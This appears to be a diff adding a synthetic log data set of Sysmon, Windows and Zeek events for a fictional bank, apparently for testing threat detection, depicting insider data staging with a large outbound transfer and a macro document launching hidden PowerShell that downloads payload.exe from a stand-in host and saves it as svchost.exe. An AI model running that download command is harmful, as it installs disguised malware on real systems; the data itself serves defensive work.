@@ -1,0 +1,327 @@
+[
+ {
+  "timestamp": "2026-03-27T02:10:00Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "BANKLOCAL\\it.admin",
+  "affected_host": "",
+  "action": "process_execution",
+  "event_code": 1,
+  "url": "",
+  "command": "powershell Get-Service",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG001",
+   "timestamp": "2026-03-27T02:10:00Z",
+   "source": "sysmon",
+   "EventID": 1,
+   "Image": "powershell.exe",
+   "CommandLine": "powershell Get-Service",
+   "User": "BANKLOCAL\\\\it.admin"
+  },
+  "detection_features": {
+   "is_off_hours": true,
+   "event_count_5m": 1,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T02:15:00Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "BANKLOCAL\\mscott",
+  "affected_host": "",
+  "action": "process_execution",
+  "event_code": 1,
+  "url": "",
+  "command": "powershell.exe Compress-Archive -Path \"Z:\\\\Confidential_Client_Data\\\\*\" -DestinationPath \"C:\\\\Users\\\\mscott\\\\Desktop\\\\personal_backup.zip\"",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG002",
+   "timestamp": "2026-03-27T02:15:00Z",
+   "source": "sysmon",
+   "EventID": 1,
+   "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+   "CommandLine": "powershell.exe Compress-Archive -Path \"Z:\\\\Confidential_Client_Data\\\\*\" -DestinationPath \"C:\\\\Users\\\\mscott\\\\Desktop\\\\personal_backup.zip\"",
+   "User": "BANKLOCAL\\\\mscott",
+   "ParentImage": "explorer.exe"
+  },
+  "detection_features": {
+   "is_off_hours": true,
+   "event_count_5m": 1,
+   "deviation_score": 0.5
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T02:20:00Z",
+  "log_type": "auth",
+  "source_ip": "10.0.50.44",
+  "destination_ip": "",
+  "affected_user": "mscott",
+  "affected_host": "",
+  "action": "login_success",
+  "event_code": 4624,
+  "url": "",
+  "command": "",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG003",
+   "timestamp": "2026-03-27T02:20:00Z",
+   "source": "windows_security",
+   "EventID": 4624,
+   "user": "mscott",
+   "logon_type": 2,
+   "src_ip": "10.0.50.44"
+  },
+  "detection_features": {
+   "is_off_hours": true,
+   "event_count_5m": 1,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 1
+  }
+ },
+ {
+  "timestamp": "2026-03-27T02:25:00Z",
+  "log_type": "network",
+  "source_ip": "10.0.50.44",
+  "destination_ip": "31.216.146.19",
+  "affected_user": "",
+  "affected_host": "",
+  "action": "network_connection",
+  "event_code": 0,
+  "url": "",
+  "command": "",
+  "bytes_out": 8500000000,
+  "raw_event": {
+   "log_id": "LOG004",
+   "timestamp": "2026-03-27T02:25:00Z",
+   "source": "zeek",
+   "src_ip": "10.0.50.44",
+   "dest_ip": "31.216.146.19",
+   "dest_port": 443,
+   "service": "ssl",
+   "duration": 450.5,
+   "orig_bytes": 8500000000,
+   "resp_bytes": 1200
+  },
+  "detection_features": {
+   "is_off_hours": true,
+   "event_count_5m": 1,
+   "deviation_score": 0.9
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 1
+  }
+ },
+ {
+  "timestamp": "2026-03-27T03:00:00Z",
+  "log_type": "network",
+  "source_ip": "10.0.30.10",
+  "destination_ip": "52.95.110.1",
+  "affected_user": "",
+  "affected_host": "",
+  "action": "network_connection",
+  "event_code": 0,
+  "url": "",
+  "command": "",
+  "bytes_out": 5000000000,
+  "raw_event": {
+   "log_id": "LOG005",
+   "timestamp": "2026-03-27T03:00:00Z",
+   "source": "zeek",
+   "src_ip": "10.0.30.10",
+   "dest_ip": "52.95.110.1",
+   "service": "ssl",
+   "orig_bytes": 5000000000,
+   "resp_bytes": 4800000000
+  },
+  "detection_features": {
+   "is_off_hours": true,
+   "event_count_5m": 1,
+   "deviation_score": 0.5
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 1
+  }
+ },
+ {
+  "timestamp": "2026-03-27T09:10:00Z",
+  "log_type": "auth",
+  "source_ip": "10.0.20.15",
+  "destination_ip": "",
+  "affected_user": "jdoe",
+  "affected_host": "",
+  "action": "login_success",
+  "event_code": 4624,
+  "url": "",
+  "command": "",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG006",
+   "timestamp": "2026-03-27T09:10:00Z",
+   "source": "windows_security",
+   "EventID": 4624,
+   "user": "jdoe",
+   "logon_type": 2,
+   "src_ip": "10.0.20.15"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 1
+  }
+ },
+ {
+  "timestamp": "2026-03-27T09:14:22Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "BANKLOCAL\\jdoe",
+  "affected_host": "",
+  "action": "process_execution",
+  "event_code": 1,
+  "url": "http://evil-domain.com/payload.exe",
+  "command": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c \"Invoke-WebRequest -Uri '<http://evil-domain.com/payload.exe>' -OutFile 'C:\\\\Users\\\\Public\\\\svchost.exe'\"",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG007",
+   "timestamp": "2026-03-27T09:14:22Z",
+   "source": "sysmon",
+   "EventID": 1,
+   "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+   "CommandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c \"Invoke-WebRequest -Uri '<http://evil-domain.com/payload.exe>' -OutFile 'C:\\\\Users\\\\Public\\\\svchost.exe'\"",
+   "User": "BANKLOCAL\\\\jdoe",
+   "ParentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.9
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T09:14:25Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "",
+  "affected_host": "",
+  "action": "file_created",
+  "event_code": 11,
+  "url": "",
+  "command": "",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG008",
+   "timestamp": "2026-03-27T09:14:25Z",
+   "source": "sysmon",
+   "EventID": 11,
+   "Image": "powershell.exe",
+   "TargetFilename": "C:\\\\Users\\\\Public\\\\svchost.exe"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.9
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T09:15:00Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "BANKLOCAL\\jdoe",
+  "affected_host": "",
+  "action": "process_execution",
+  "event_code": 1,
+  "url": "",
+  "command": "invoice.docm",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG009",
+   "timestamp": "2026-03-27T09:15:00Z",
+   "source": "sysmon",
+   "EventID": 1,
+   "Image": "WINWORD.EXE",
+   "CommandLine": "invoice.docm",
+   "User": "BANKLOCAL\\\\jdoe"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.5
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T09:16:30Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "BANKLOCAL\\jdoe",
+  "affected_host": "",
+  "action": "process_execution",
+  "event_code": 1,
+  "url": "https://mail.bank.local",
+  "command": "chrome.exe <https://mail.bank.local>",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG010",
+   "timestamp": "2026-03-27T09:16:30Z",
+   "source": "sysmon",
+   "EventID": 1,
+   "Image": "chrome.exe",
+   "CommandLine": "chrome.exe <https://mail.bank.local>",
+   "User": "BANKLOCAL\\\\jdoe"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ }
+]
